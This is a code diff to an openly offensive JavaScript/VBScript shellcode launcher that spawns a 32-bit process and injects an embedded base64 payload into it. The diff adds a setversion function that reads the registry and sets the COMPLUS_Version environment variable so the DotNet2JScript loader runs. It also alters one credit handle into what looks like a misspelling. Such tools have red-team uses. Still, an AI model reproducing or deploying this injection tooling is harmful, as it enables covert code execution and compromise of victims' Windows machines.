@@ -11,7 +11,7 @@
    Author: Vincent Yiu (@vysecurity)
    Credits:
      - @cn33liz: Inspiration with StarFighter
-     - @tiraniddo: James Forshaw for DotNet2JScript
+     - @ttiraniddo: James Forshaw for DotNet2JScript
      - @armitagehacker: Raphael Mudge for idea of selecting 32 bit version on 64 bit architecture machines for injection into
   
    A JavaScript and VBScript shellcode launcher. This will spawn a 32 bit version of the binary specified and inject shellcode into it.
@@ -34,6 +34,15 @@ var code = "TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAA
 // ------------ DO NOT EDIT BELOW HERE --------------
 
 function setversion() {
+var shell = new ActiveXObject('WScript.Shell');
+ver = 'v4.0.30319';
+try {
+shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
+} catch(e) { 
+ver = 'v2.0.50727';
+}
+shell.Environment('Process')('COMPLUS_Version') = ver;
+
 }
 function debug(s) {}
 function base64ToStream(b) {
